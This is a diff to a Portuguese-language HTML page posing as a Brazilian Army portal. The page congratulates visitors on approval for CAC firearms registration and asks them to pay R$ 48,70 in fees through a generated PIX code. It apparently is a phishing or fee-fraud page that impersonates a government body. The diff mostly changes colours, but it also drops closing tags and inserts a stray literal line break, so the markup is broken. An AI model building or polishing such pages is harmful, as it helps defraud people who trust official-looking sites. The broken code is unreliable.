@@ -102,7 +102,7 @@
             width: 50px;
             height: 50px;
             border: 5px solid #e2e8f0;
-            border-top: 5px solid #166534;
+             border-top: 5px solid #1e3a8a;
             border-radius: 50%;
             animation: spin 1s linear infinite;
         }
@@ -175,11 +175,11 @@
 
     <div id="loadingScreen" class="loading-screen fade-out">
         <div class="spinner mb-8"></div>
-        <div id="loadingStatus" class="text-lg font-semibold text-green-800 mb-4">Verificando Histórico criminal</div>
+          <div id="loadingStatus" class="text-lg font-semibold text-blue-800 mb-4">Verificando Histórico criminal</div>
     </div>
 
     <div class="fixed-header">
-        <header class="bg-green-800 text-white shadow-md">
+            <header class="bg-green-700 text-white shadow-md">
             <div class="container mx-auto px-4">
                 <div class="flex items-center justify-center h-14">
                     <div class="flex items-center">
@@ -187,8 +187,6 @@
                         <div>
                             <div class="text-xs">Ministério da Defesa</div>
                             <div class="font-bold text-sm">Exército Brasileiro</div>
-                        </div>
-                    </div>
                 </div>
             </div>
         </header>
@@ -196,14 +194,13 @@
 
     <main class="container mx-auto px-4 py-10 mt-14">
         <div class="bg-white shadow-lg rounded-lg overflow-hidden">
-            <div class="bg-green-700 text-white py-4 px-6">
+                <div class="bg-blue-800 text-white py-4 px-6">
                 <h1 class="text-2xl font-bold">Parabéns! Você foi aprovado no processo de Registro CAC</h1>
             </div>
             <div class="p-6">
                 <div class="mb-6">
                     <p class="mb-3 text-base">Temos o prazer de informar que você foi aprovado nos testes para obtenção do Certificado de Registro de Colecionador, Atirador e Caçador (CAC). Seu certificado será enviado para o endereço cadastrado em até 30 dias.</p>
-                    <p class="mb-3 text-base">Para concluir o processo e receber seu certificado, é necessário efetuar o pagamento das taxas referentes ao registro CAC no Brasil.</p>
-                </div>
+                     <p class="mb-3 text-base">Para concluir o processo e receber seu certificado, é necessário efetuar o pagamento das taxas referentes ao registro CAC no Brasil.</p>\n                 </div>
 
                 <div class="bg-gray-100 rounded-lg p-4 mb-6">
                     <h2 class="text-lg font-semibold mb-3">As taxas incluem:</h2>
@@ -213,18 +210,18 @@
                         <li>Taxa para aquisição de arma de fogo</li>
                     </ul>
                     <div class="mt-4 pt-4 border-t border-gray-300">
-                        <p class="text-2xl font-bold text-green-800 text-center">
-                            Valor Total: R$ 48,70
-                        </p>
+                            <p class="text-2xl font-bold text-blue-900 text-center">
+                                Valor Total: R$ 48,70
+                            </p>
                         <p class="text-sm text-gray-600 text-center mt-1">Pagamento via PIX</p>
-                    </div>
+                     </div>
                 </div>
 
                 <p class="mb-6 text-base">Gerando seu código PIX para pagamento...</p>
                 
                 <div id="pix-loading" class="text-center py-8">
                     <div class="spinner mx-auto mb-4"></div>
-                    <p class="text-gray-600">Gerando código PIX...</p>
+                     <p class="text-gray-600">Gerando código PIX...</p>
                 </div>
                 
                 <div id="pix-container" class="mb-6"></div>
@@ -232,7 +229,7 @@
                 <div id="payment-button-container" class="flex justify-center" style="display: none;">
                     <button id="paymentButton" onclick="gerarPix()" class="bg-red-600 hover:bg-red-700 text-white font-bold py-3 px-6 rounded-full text-base animate-left-right inline-flex items-center justify-center">
                         <span>Gerar PIX para Pagamento</span>
-                        <i class="fas fa-arrow-right ml-2"></i>
+                         <i class="fas fa-arrow-right ml-2"></i>
                     </button>
                 </div>
             </div>
@@ -245,7 +242,7 @@
         </div>
     </main>
 
-    <footer class="bg-green-900 text-white py-8">
+    <footer class="bg-blue-950 text-white py-8">
         <div class="container mx-auto px-4">
             <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-5 gap-8">
                 <div>
@@ -286,12 +283,12 @@
                         <a href="#" class="text-white hover:text-gray-300 text-2xl"><i class="fab fa-instagram"></i></a>
                         <a href="#" class="text-white hover:text-gray-300 text-2xl"><i class="fab fa-twitter"></i></a>
                         <a href="#" class="text-white hover:text-gray-300 text-2xl"><i class="fab fa-youtube"></i></a>
-                    </div>
+                     </div>
                 </div>
             </div>
         </div>
     </footer>
-    <div class="bg-green-950 text-white text-sm py-3 text-center">
+    <div class="bg-blue-900 text-white text-sm py-3 text-center">
         Portal produzido pelo Exército Brasileiro - Todos os Direitos Reservados.
     </div>
 
